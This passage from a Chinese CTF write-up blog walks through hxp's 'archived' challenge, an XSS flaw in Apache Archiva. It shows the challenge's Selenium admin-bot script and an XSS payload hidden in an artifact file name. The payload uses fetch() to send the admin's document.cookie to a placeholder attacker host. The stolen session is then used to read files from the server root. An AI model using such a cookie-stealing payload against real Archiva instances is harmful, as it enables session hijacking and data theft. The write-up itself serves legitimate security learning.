class="subst">&#123;m.group(<span class="string">&#x27;uuid&#x27;</span>)&#125;</span>?name=a&amp;delimiter=?&quot;</span>)</span><br><span class="line">m = re.search(<span class="string">r&quot;hxp\&#123;[^&#125;]+\&#125;&quot;</span>, r.text)</span><br><span class="line"><span class="built_in">print</span>(m.group(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679060331371-5c42ad1c-0839-4cd7-872d-fb6482da3c58.png#averageHue=%232b2a23&clientId=u8f9c4623-77be-4&from=paste&height=161&id=uf9899203&name=image.png&originHeight=161&originWidth=1035&originalType=binary&ratio=1&rotation=0&showTitle=false&size=252971&status=done&style=none&taskId=u0c55faa6-49ce-4489-85c9-58c77722e1b&title=&width=1035" alt="image.png"></p>
<h1 id="archived"><a href="#archived" class="headerlink" title="archived"></a>archived</h1><p>考点：<code>Apache Archiva</code>的xss 0day<br>这里本地复现的时候因为docker里有一个东西很傻逼，他docke文件中有个sh文件调用了curl方法下载一个100mb的文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679062820327-e8aba001-44c6-4b67-887a-d8c6dc17f5c3.png#averageHue=%232c2c25&clientId=u87f7e5c3-9c2c-4&from=paste&height=251&id=uecceb85b&name=image.png&originHeight=251&originWidth=1356&originalType=binary&ratio=1&rotation=0&showTitle=false&size=482911&status=done&style=none&taskId=uf07e0f83-66d4-4078-a0f6-b4b25b37606&title=&width=1356" alt="image.png"><br>加上种种原因双重折磨，我就不复现了（lazy_dog)<br>大致介绍一下，就是一个可以上传仓库Artifact的app，上传后大概如下（偷葵的图片)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679062995889-90cc876c-cbcc-44c2-b1b0-603d1ddba5bf.png#averageHue=%23f6f6f5&clientId=u87f7e5c3-9c2c-4&from=paste&id=u68fb7aea&name=image.png&originHeight=269&originWidth=695&originalType=url&ratio=1&rotation=0&showTitle=false&size=28748&status=done&style=none&taskId=u3e547cb7-f103-42b2-9721-bb063e8dbb4&title=" alt="image.png"><br>然后管理员bot行为如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line"><span class="keyword">from</span> webdriver_manager.chrome <span class="keyword">import</span> ChromeDriverManager</span><br><span class="line"><span class="keyword">from</span> webdriver_manager.core.utils <span class="keyword">import</span> ChromeType</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">prompt, regex</span>):</span><br><span class="line">    inp = <span class="built_in">input</span>(prompt)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(regex, inp):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Input <span class="subst">&#123;inp&#125;</span> does not match regex <span class="subst">&#123;regex&#125;</span>&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> inp</span><br><span class="line"></span><br><span class="line">USERNAME = <span class="string">&quot;admin&quot;</span></span><br><span class="line">PASSWORD = <span class="string">&quot;admin123&quot;</span></span><br><span class="line">CHALLENGE_IP = <span class="string">&quot;chall&quot;</span></span><br><span class="line">PROXY_USERNAME = <span class="string">&quot;hxp&quot;</span></span><br><span class="line">PROXY_PASSWORD = <span class="string">&quot;hxp&quot;</span></span><br><span class="line">PORT = <span class="number">8081</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">3</span>:</span><br><span class="line">    <span class="comment"># remote setup, IP, proxy, admin_password and port will differ!</span></span><br><span class="line">    CHALLENGE_IP = sys.argv[<span class="number">1</span>]</span><br><span class="line">    PASSWORD = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please supply connection details for your instance&quot;</span>)</span><br><span class="line">    PROXY_USERNAME = get(<span class="string">&quot;Please give instance username: &quot;</span>, <span class="string">r&quot;^[a-zA-Z0-9_-]+$&quot;</span>)</span><br><span class="line">    PROXY_PASSWORD = get(<span class="string">&quot;Please give instance password: &quot;</span>, <span class="string">r&quot;^[a-zA-Z0-9_-]+$&quot;</span>)</span><br><span class="line">    PORT = get(<span class="string">&quot;Please give instance port: &quot;</span>, <span class="string">r&quot;^\d+$&quot;</span>)</span><br><span class="line"></span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">&quot;--disable-dev-shm-usage&quot;</span>)</span><br><span class="line">driver = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    driver = webdriver.Chrome(service=Service(ChromeDriverManager(chrome_type=ChromeType.CHROMIUM).install()), options=chrome_options)</span><br><span class="line">    wait = WebDriverWait(driver, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># log in</span></span><br><span class="line">    base_url = <span class="string">f&quot;http://<span class="subst">&#123;quote(PROXY_USERNAME)&#125;</span>:<span class="subst">&#123;quote(PROXY_PASSWORD)&#125;</span>@<span class="subst">&#123;CHALLENGE_IP&#125;</span>:<span class="subst">&#123;PORT&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Logging in to <span class="subst">&#123;base_url&#125;</span>&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    driver.get(base_url)</span><br><span class="line"></span><br><span class="line">    wait.until(<span class="keyword">lambda</span> d: d.find_element(By.ID, <span class="string">&quot;login-link-a&quot;</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    driver.find_element(By.ID, <span class="string">&quot;login-link-a&quot;</span>).click()</span><br><span class="line"></span><br><span class="line">    wait.until(<span class="keyword">lambda</span> d: d.find_element(By.ID, <span class="string">&quot;modal-login&quot;</span>).get_attribute(<span class="string">&quot;aria-hidden&quot;</span>) == <span class="string">&quot;false&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    username_input = driver.find_element(By.ID, <span class="string">&quot;user-login-form-username&quot;</span>)</span><br><span class="line">    username_input.send_keys(USERNAME)</span><br><span class="line"></span><br><span class="line">    password_input = driver.find_element(By.ID, <span class="string">&quot;user-login-form-password&quot;</span>)</span><br><span class="line">    password_input.send_keys(PASSWORD)</span><br><span class="line"></span><br><span class="line">    login_button = driver.find_element(By.ID, <span class="string">&quot;modal-login-ok&quot;</span>)</span><br><span class="line">    login_button.click()</span><br><span class="line"></span><br><span class="line">    wait.until(<span class="keyword">lambda</span> driver: driver.execute_script(<span class="string">&quot;return document.readyState&quot;</span>) == <span class="string">&quot;complete&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Hopefully logged in&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># visit url</span></span><br><span class="line">    url = <span class="string">f&quot;http://<span class="subst">&#123;CHALLENGE_IP&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/repository/internal&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Visiting <span class="subst">&#123;url&#125;</span>&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    driver.get(url)</span><br><span class="line">    wait.until(<span class="keyword">lambda</span> driver: driver.execute_script(<span class="string">&quot;return document.readyState&quot;</span>) == <span class="string">&quot;complete&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e, file=sys.stderr, flush=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Error while visiting&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">if</span> driver:</span><br><span class="line">        driver.quit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Done visiting&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>审一下发现会定期访问<code>/repository/internal</code>路由，也就是我们上传仓库的地址，我们要在这个界面触发xss拿到管理员的cookie，这里可以直接滞空前面3个选项，最后一个文件名填上我们的xsspayload，其中要绕过<code>/</code>，因为文件名不允许这个符号存在，可以用document.charCodeAt去绕过：<br><code>&lt;img src=a onerror=&quot;fetch(String.fromCharCode(47)+String.fromCharCode(47)+&#39;&#123;my_host&#125;:&#123;my_port&#125;&#39;+String.fromCharCode(47)+btoa(document.cookie))&quot;&gt;</code>最后payload大概长这样，拿到cookie后变为管理员，会多出一个创建仓库，这里可以指定仓库的目录，指定为根目录直接读取flag即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679063357854-1bdfed6b-34be-4f8c-823a-d80189b4df46.png#averageHue=%23fcfcfb&clientId=u87f7e5c3-9c2c-4&from=paste&id=uc02fb085&name=image.png&originHeight=780&originWidth=624&originalType=url&ratio=1&rotation=0&showTitle=false&size=75541&status=done&style=none&taskId=u3c093cbc-0e16-4ec0-b20a-ced436b972f&title=" alt="image.png"><br>到这里题目作者还想要进行RCE,我觉得不太现实，因为仅凭XSS不太可能RCE我只能说</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/hxp/" class="tag">#hxp</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/04/02/DiceCTF2023%20_%20Web/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">DiceCTF2023 Web</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/29/TCTF2022%20_%20Hessian-onlyJdk/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">TCTF2022 Hessian-onlyJdk</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>